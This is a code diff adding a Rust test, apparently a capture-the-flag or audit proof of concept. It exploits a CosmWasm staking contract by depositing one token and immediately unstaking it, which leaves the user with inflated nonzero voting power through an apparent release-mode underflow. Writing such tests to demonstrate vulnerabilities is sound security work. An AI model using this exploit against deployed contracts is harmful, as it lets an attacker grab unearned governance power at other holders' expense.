@@ -151,4 +151,46 @@ pub mod tests {
         let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
         assert_eq!(balance, amount);
     }
+
+    //@note this exploit is only successful when testing in release mode
+    #[test]
+    fn test_exploit(){
+        let (mut app, contract_addr) = proper_instantiate(); 
+
+        //user needs just one token to do this
+        app = mint_tokens(app, USER.to_string(), Uint128::new(1));
+        println!("depositing nothing to make a record in VOTING_POWER");
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &vec![coin(1, DENOM)]
+        ).unwrap();
+
+        //fast forward by lock period
+        //println!("one day goes by");
+        //app.update_block(
+        //    |block_info| {
+        //        block_info.time = block_info.time.plus_seconds(LOCK_PERIOD);
+        //    }
+        //);
+
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Unstake {
+                unlock_amount: 1
+            },
+            &vec![]
+        ).unwrap();
+
+
+        let new_voting_power: u128 = app.wrap().query_wasm_smart(
+            contract_addr.clone(),
+            &QueryMsg::GetVotingPower { user: String::from(USER)},
+        ).unwrap();
+        
+        println!("checking if we have nonzero voting power");
+        assert!(new_voting_power > 0);
+    }
 }
